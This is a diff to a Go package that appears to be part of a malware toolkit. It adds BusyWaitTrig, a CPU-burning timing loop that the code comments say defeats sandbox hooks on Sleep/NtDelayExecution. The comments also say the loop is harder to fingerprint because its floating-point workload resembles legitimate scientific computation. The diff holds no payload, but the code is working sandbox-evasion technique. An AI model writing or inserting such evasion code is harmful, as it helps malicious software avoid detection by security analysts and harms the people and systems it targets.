@@ -2,7 +2,14 @@
 // These defeat sandbox analysis that fast-forwards Sleep() calls.
 package timing
 
-import "time"
+import (
+	"math"
+	"time"
+)
+
+// busySink receives the result of BusyWaitTrig computations.
+// Prevents dead-code elimination by the compiler.
+var busySink float64
 
 // BusyWait burns CPU for the specified duration without calling Sleep.
 // Defeats sandbox hooks on NtDelayExecution/Sleep that fast-forward time.
@@ -18,6 +25,22 @@ func BusyWait(d time.Duration) {
 // For custom iteration counts, use BusyWaitPrimalityN.
 func BusyWaitPrimality() {
 	BusyWaitPrimalityN(500_000)
+}
+
+// BusyWaitTrig burns CPU for the specified duration using trigonometric
+// computations (sin/cos). Harder to fingerprint than an empty loop or
+// primality testing because the floating-point workload resembles
+// legitimate scientific computation.
+func BusyWaitTrig(d time.Duration) {
+	deadline := time.Now().Add(d)
+	acc := 1.0
+	for time.Now().Before(deadline) {
+		for i := 0; i < 1000; i++ {
+			acc += math.Sin(acc) * math.Cos(acc)
+			acc = math.Abs(acc) + 0.1
+		}
+	}
+	busySink = acc
 }
 
 // BusyWaitPrimalityN is like BusyWaitPrimality but with a configurable
